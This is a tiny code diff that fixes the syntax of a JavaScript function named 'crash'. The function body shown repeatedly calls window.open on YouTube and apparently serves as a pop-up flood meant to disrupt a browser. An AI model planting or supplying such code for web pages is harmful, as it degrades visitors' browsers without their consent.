@@ -1,5 +1,5 @@
 
-function("Crash"){
+function crash(){
 window.open("https://Youtube.com", "Crash");
 window.open("https://Youtube.com", "Crash");
 window.open("https://Youtube.com", "Crash");
